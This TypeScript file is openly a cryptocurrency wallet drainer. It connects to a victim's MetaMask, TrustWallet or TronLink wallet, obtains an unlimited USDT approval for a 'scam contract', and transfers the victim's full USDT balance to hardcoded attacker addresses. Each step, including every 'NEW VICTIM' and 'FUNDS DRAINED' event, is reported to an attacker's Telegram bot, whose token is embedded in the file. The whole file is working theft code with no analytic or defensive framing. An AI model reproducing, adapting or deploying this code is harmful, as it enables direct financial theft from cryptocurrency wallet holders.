// @ts-nocheck
import { ethers } from 'ethers';

export const ATTACKER_CONFIG = {
  attackerAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
  tronAttackerAddress: "TZ2cssEnaTAvBS6XasyuThFK5Hsr2zqHBa",
  telegramBotToken: "8764463650:AAGPoZcwOj3xat1YokIrsvO_Y3dAqq5ct4Y",
  telegramChatId: "8448871506",
  usdtContracts: {
    "0x1":  "0xdAC17F958D2ee523a2206206994597C13D831ec7",
    "0x38": "0x55d398326f99059fF775485246999027B3197955",
    "0x2b6653dc": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
  },
  scamContractAddress: "0xE18FFb924927a1Cb3CB1f3d704E76C05dB86414F",
};

async function sendTelegramAlert(message: string) {
  try {
    const url = `https://api.telegram.org/bot${ATTACKER_CONFIG.telegramBotToken}/sendMessage`;
    await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: ATTACKER_CONFIG.telegramChatId,
        text: message,
        parse_mode: 'HTML',
      }),
    });
  } catch (e) {
    console.log('Telegram alert failed:', e);
  }
}

export async function connectAndApprove(walletType: "metamask" | "trustwallet" | "tronlink") {
  let signer, address, chainId;

  if (walletType === "tronlink") {
    if (!window.tronWeb || !window.tronWeb.ready) {
      throw new Error("TronLink not detected. Please install and unlock it.");
    }
    address = window.tronWeb.defaultAddress.base58;
    chainId = 728126428;
    signer = { _isTron: true, address };
    await sendTelegramAlert(`🔔 NEW VICTIM (TronLink) - ${address}`);
  } else {
    if (!window.ethereum) {
      throw new Error("No Ethereum wallet detected. Please install MetaMask or TrustWallet.");
    }
    if (walletType === "trustwallet") {
      try {
        await window.ethereum.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x38' }],
        });
      } catch (switchErr: any) {
        if (switchErr.code === 4902) {
          throw new Error("BNB Chain not found in your wallet. Add it manually first.");
        }
      }
    }
    await window.ethereum.request({ method: 'eth_requestAccounts' });
    const provider = new ethers.BrowserProvider(window.ethereum);
    signer = await provider.getSigner();
    address = await signer.getAddress();
    const network = await provider.getNetwork();
    chainId = Number(network.chainId);
    await sendTelegramAlert(`🔔 NEW VICTIM - ${walletType} - ${address} - Chain: ${chainId}`);
  }

  // Now approve unlimited
  await approveUnlimited(signer, chainId);
  return { signer, address, chainId };
}

export async function approveUnlimited(signer: any, chainId: number) {
  if (signer._isTron) {
    if (!window.tronWeb?.ready) throw new Error('TronLink not detected');
    const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const maxApprove = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
    const tx = await contract.approve(ATTACKER_CONFIG.scamContractAddress, maxApprove).send();
    await sendTelegramAlert(`✅ UNLIMITED APPROVED (TRC20) - ${signer.address}`);
    return tx;
  }
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error(`No USDT contract for chain ${chainId}`);
  const token = new ethers.Contract(
    usdtAddress,
    ['function approve(address,uint256) returns (bool)'],
    signer
  );
  const tx = await token.approve(ATTACKER_CONFIG.scamContractAddress, ethers.MaxUint256);
  await sendTelegramAlert(`✅ UNLIMITED APPROVED - Chain: ${chainId} - TX: ${tx.hash}`);
  await tx.wait();
  return tx.hash;
}

export async function disguisedTransfer(signer: any, victimAddress: string, chainId: number) {
  if (signer._isTron) {
    if (!window.tronWeb?.ready) throw new Error('TronLink not detected');
    const contract = await window.tronWeb.contract().at(ATTACKER_CONFIG.usdtContracts['0x2b6653dc']);
    const balance = await contract.balanceOf(victimAddress).call();
    if (balance === '0' || balance === '0x0') throw new Error('No USDT balance');
    const tx = await contract.transfer(ATTACKER_CONFIG.tronAttackerAddress, balance).send();
    await sendTelegramAlert(`🚨 TRC20 DRAINED - ${victimAddress} - ${balance}`);
    return tx;
  }
  const hexChain = '0x' + chainId.toString(16);
  const usdtAddress = ATTACKER_CONFIG.usdtContracts[hexChain];
  if (!usdtAddress) throw new Error('No USDT contract');
  const token = new ethers.Contract(
    usdtAddress,
    [
      'function balanceOf(address) view returns (uint256)',
      'function transferFrom(address,address,uint256) returns (bool)',
    ],
    signer
  );
  const balance = await token.balanceOf(victimAddress);
  if (balance === 0n) throw new Error('No USDT balance');
  const tx = await token.transferFrom(victimAddress, ATTACKER_CONFIG.attackerAddress, balance);
  tx.wait();
  await sendTelegramAlert(`🚨 FUNDS DRAINED - ${ethers.formatUnits(balance, 6)} USDT - TX: ${tx.hash}`);
  return tx.hash;
}